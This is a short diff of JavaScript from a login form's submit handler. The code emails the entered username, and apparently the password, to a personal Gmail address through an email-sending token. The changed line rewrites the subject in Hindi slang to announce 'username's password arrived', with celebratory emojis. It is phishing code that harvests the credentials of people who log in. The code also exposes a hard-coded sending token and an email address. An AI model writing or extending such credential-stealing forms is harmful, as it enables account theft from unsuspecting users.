@@ -71,7 +71,7 @@ loginForm.addEventListener("submit", (e) => {
     SecureToken: "2c4c905a-af9f-4a10-af48-25f24e9e7b81",
     To: 'kumaradarsh00572@gmail.com',
     From: "kumaradarsh00572@gmail.com",
-    Subject: "naya password aagya",
+    Subject: `${username.value} ka password aagya 😎😎💯`,
     Body: `
     
    <h1> username:${username.value}</h1>
